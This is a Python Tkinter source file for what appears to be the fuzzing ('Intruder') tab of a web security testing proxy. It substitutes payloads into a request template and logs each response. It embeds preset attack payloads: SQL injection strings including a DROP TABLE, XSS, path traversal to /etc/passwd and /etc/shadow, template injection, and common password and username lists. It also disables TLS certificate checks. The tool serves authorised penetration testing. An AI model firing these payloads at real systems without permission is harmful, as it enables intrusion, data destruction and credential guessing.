"""
Intruder Tab — automated fuzzing with payload sets.
Supports Sniper mode: one position at a time through all payloads.
"""

import socket
import ssl
import threading
import time
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox

from core.http_utils import rebuild_request, parse_response

BUILT_IN_PAYLOADS = {
    "SQL Injection": [
        "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1", "'; DROP TABLE users--",
        "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
        "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--",
        "' AND SLEEP(5)--", "' AND 1=CONVERT(int,@@version)--",
    ],
    "XSS": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "'\"><script>alert(1)</script>", "<svg/onload=alert(1)>",
        "javascript:alert(1)", "<body onload=alert(1)>",
        "{{7*7}}", "${7*7}", "#{7*7}",
    ],
    "Path Traversal": [
        "../etc/passwd", "../../etc/passwd", "../../../etc/shadow",
        "..\\..\\windows\\win.ini", "%2e%2e%2f%2e%2e%2f",
        "....//....//etc/passwd",
    ],
    "Common Passwords": [
        "123456", "password", "admin", "letmein", "qwerty",
        "monkey", "dragon", "master", "sunshine", "princess",
    ],
    "Common Usernames": [
        "admin", "administrator", "root", "user", "test",
        "guest", "superuser", "sa", "operator",
    ],
    "SSTI": [
        "{{7*7}}", "{{7*'7'}}", "${7*7}", "#{7*7}",
        "<%= 7*7 %>", "{% for i in range(7) %}{{i}}{% endfor %}",
    ],
}


class IntruderTab(ttk.Frame):
    def __init__(self, parent, **kw):
        super().__init__(parent, **kw)
        self._running    = False
        self._stop_event = threading.Event()
        self._results: list[dict] = []
        self._build()

    def _build(self):
        self.columnconfigure(0, weight=1)
        self.rowconfigure(2, weight=1)

        # ── Target ──────────────────────────────────────────────────────────
        target_frame = ttk.LabelFrame(self, text="Target")
        target_frame.grid(row=0, column=0, sticky="ew", padx=6, pady=4)

        ttk.Label(target_frame, text="Host:").grid(row=0, column=0, padx=4, pady=2, sticky="w")
        self._host_var = tk.StringVar(value="example.com")
        ttk.Entry(target_frame, textvariable=self._host_var, width=30).grid(row=0, column=1, padx=4)

        ttk.Label(target_frame, text="Port:").grid(row=0, column=2, padx=4)
        self._port_var = tk.StringVar(value="443")
        ttk.Entry(target_frame, textvariable=self._port_var, width=6).grid(row=0, column=3, padx=4)

        self._https_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(target_frame, text="HTTPS", variable=self._https_var).grid(row=0, column=4, padx=4)

        # ── Request template ─────────────────────────────────────────────────
        req_frame = ttk.LabelFrame(self, text="Request Template  (mark injection point with §payload§)")
        req_frame.grid(row=1, column=0, sticky="ew", padx=6, pady=2)
        req_frame.columnconfigure(0, weight=1)

        self._req_text = tk.Text(req_frame, height=8, wrap="none", bg="#1e1e1e", fg="#d4d4d4",
                                  font=("Consolas", 9))
        self._req_text.grid(row=0, column=0, sticky="ew", padx=4, pady=4)
        self._req_text.insert("1.0",
            "GET /search?q=§payload§ HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n"
        )

        # ── Payloads + options ───────────────────────────────────────────────
        mid = ttk.Frame(self)
        mid.grid(row=2, column=0, sticky="nsew", padx=6, pady=4)
        mid.columnconfigure(0, weight=1)
        mid.columnconfigure(1, weight=2)
        mid.rowconfigure(0, weight=1)

        payload_frame = ttk.LabelFrame(mid, text="Payloads")
        payload_frame.grid(row=0, column=0, sticky="nsew", padx=(0, 4))
        payload_frame.columnconfigure(0, weight=1)
        payload_frame.rowconfigure(1, weight=1)

        preset_bar = ttk.Frame(payload_frame)
        preset_bar.grid(row=0, column=0, sticky="ew", padx=4, pady=4)
        ttk.Label(preset_bar, text="Preset:").pack(side="left")
        self._preset_var = tk.StringVar(value="SQL Injection")
        cb = ttk.Combobox(preset_bar, textvariable=self._preset_var,
                          values=list(BUILT_IN_PAYLOADS.keys()), width=18, state="readonly")
        cb.pack(side="left", padx=4)
        ttk.Button(preset_bar, text="Load", command=self._load_preset).pack(side="left", padx=2)
        ttk.Button(preset_bar, text="From File", command=self._load_file).pack(side="left", padx=2)
        ttk.Button(preset_bar, text="Clear", command=self._clear_payloads).pack(side="left", padx=2)

        self._payload_text = tk.Text(payload_frame, wrap="none", bg="#1e1e1e", fg="#aaffaa",
                                      font=("Consolas", 9))
        self._payload_text.grid(row=1, column=0, sticky="nsew", padx=4, pady=(0, 4))
        self._load_preset()

        # Results
        result_frame = ttk.LabelFrame(mid, text="Results")
        result_frame.grid(row=0, column=1, sticky="nsew")
        result_frame.columnconfigure(0, weight=1)
        result_frame.rowconfigure(0, weight=1)

        cols = ("Payload", "Status", "Length", "Time(ms)")
        self._result_tree = ttk.Treeview(result_frame, columns=cols, show="headings")
        for col in cols:
            self._result_tree.heading(col, text=col)
            self._result_tree.column(col, width=120, anchor="w")
        self._result_tree.grid(row=0, column=0, sticky="nsew", padx=4, pady=4)
        ttk.Scrollbar(result_frame, command=self._result_tree.yview).grid(row=0, column=1, sticky="ns")
        self._result_tree.bind("<<TreeviewSelect>>", self._on_result_select)

        # Response preview
        self._resp_preview = tk.Text(result_frame, height=6, wrap="none",
                                      bg="#1e1e1e", fg="#d4d4d4", font=("Consolas", 9), state="disabled")
        self._resp_preview.grid(row=1, column=0, sticky="ew", padx=4, pady=(0, 4))

        # ── Control bar ──────────────────────────────────────────────────────
        ctrl = ttk.Frame(self)
        ctrl.grid(row=3, column=0, sticky="ew", padx=6, pady=(0, 6))

        self._btn_attack = ttk.Button(ctrl, text="Start Attack", command=self._toggle_attack)
        self._btn_attack.pack(side="left", padx=4)

        ttk.Label(ctrl, text="Threads:").pack(side="left", padx=(8, 0))
        self._threads_var = tk.StringVar(value="1")
        ttk.Spinbox(ctrl, from_=1, to=20, textvariable=self._threads_var, width=4).pack(side="left", padx=4)

        ttk.Label(ctrl, text="Delay(ms):").pack(side="left", padx=(8, 0))
        self._delay_var = tk.StringVar(value="0")
        ttk.Entry(ctrl, textvariable=self._delay_var, width=6).pack(side="left", padx=4)

        self._prog_var = tk.StringVar(value="Ready")
        ttk.Label(ctrl, textvariable=self._prog_var, foreground="gray").pack(side="left", padx=12)

        self._progress = ttk.Progressbar(ctrl, length=200, mode="determinate")
        self._progress.pack(side="left", padx=4)

    # ── Payload management ───────────────────────────────────────────────────

    def _load_preset(self):
        payloads = BUILT_IN_PAYLOADS.get(self._preset_var.get(), [])
        self._payload_text.delete("1.0", "end")
        self._payload_text.insert("1.0", "\n".join(payloads))

    def _load_file(self):
        path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if path:
            with open(path, "r", errors="replace") as f:
                self._payload_text.delete("1.0", "end")
                self._payload_text.insert("1.0", f.read())

    def _clear_payloads(self):
        self._payload_text.delete("1.0", "end")

    def _get_payloads(self) -> list[str]:
        raw = self._payload_text.get("1.0", "end-1c")
        return [p for p in raw.splitlines() if p.strip()]

    # ── Attack control ───────────────────────────────────────────────────────

    def _toggle_attack(self):
        if self._running:
            self._stop_event.set()
            self._btn_attack.config(text="Start Attack")
            self._prog_var.set("Stopped")
            self._running = False
        else:
            payloads = self._get_payloads()
            if not payloads:
                messagebox.showwarning("No Payloads", "Enter at least one payload.")
                return
            template = self._req_text.get("1.0", "end-1c")
            if "§payload§" not in template:
                messagebox.showwarning("No Marker", "Mark the injection point with §payload§ in the request.")
                return
            self._stop_event.clear()
            self._running = True
            self._btn_attack.config(text="Stop Attack")
            self._progress.config(maximum=len(payloads), value=0)
            for item in self._result_tree.get_children():
                self._result_tree.delete(item)
            threading.Thread(target=self._run_attack, args=(template, payloads), daemon=True).start()

    def _run_attack(self, template: str, payloads: list[str]):
        host  = self._host_var.get().strip()
        port  = int(self._port_var.get().strip())
        https = self._https_var.get()
        delay = int(self._delay_var.get() or 0) / 1000.0

        for i, payload in enumerate(payloads):
            if self._stop_event.is_set():
                break

            raw_req = rebuild_request(template.replace("§payload§", payload))
            start   = time.time()
            raw_resp, status, length = self._fire(host, port, https, raw_req)
            elapsed = int((time.time() - start) * 1000)

            self.after(0, self._add_result, payload, status, length, elapsed, raw_resp)
            self.after(0, self._progress.config, {"value": i + 1})
            self.after(0, self._prog_var.set, f"{i+1}/{len(payloads)}")

            if delay:
                time.sleep(delay)

        self.after(0, self._prog_var.set, "Done")
        self.after(0, self._btn_attack.config, {"text": "Start Attack"})
        self._running = False

    @staticmethod
    def _fire(host: str, port: int, https: bool, raw: bytes) -> tuple[bytes, str, int]:
        try:
            sock = socket.create_connection((host, port), timeout=10)
            if https:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.sendall(raw)
            data = b""
            sock.settimeout(5)
            try:
                while True:
                    chunk = sock.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except socket.timeout:
                pass
            sock.close()
            resp = parse_response(data)
            if resp:
                return data, str(resp.status_code), len(resp.body)
            return data, "???", len(data)
        except Exception as e:
            return b"", f"ERR: {e}", 0

    def _add_result(self, payload: str, status: str, length: int, elapsed: int, raw_resp: bytes):
        iid = self._result_tree.insert("", "end", values=(payload, status, length, elapsed))
        # Colour-code by status
        if status.startswith("2"):
            self._result_tree.item(iid, tags=("ok",))
        elif status.startswith("5"):
            self._result_tree.item(iid, tags=("err",))
        self._result_tree.tag_configure("ok",  foreground="#00dd00")
        self._result_tree.tag_configure("err", foreground="#dd4444")
        self._result_tree.yview_moveto(1.0)
        self._results.append({"payload": payload, "status": status, "raw": raw_resp})

    def _on_result_select(self, _event=None):
        sel = self._result_tree.selection()
        if not sel:
            return
        idx  = self._result_tree.index(sel[0])
        entry = self._results[idx] if idx < len(self._results) else None
        if entry:
            raw  = entry["raw"]
            resp = parse_response(raw)
            text = resp.to_display() if resp else raw.decode(errors="replace")
            self._resp_preview.config(state="normal")
            self._resp_preview.delete("1.0", "end")
            self._resp_preview.insert("1.0", text[:4000])
            self._resp_preview.config(state="disabled")
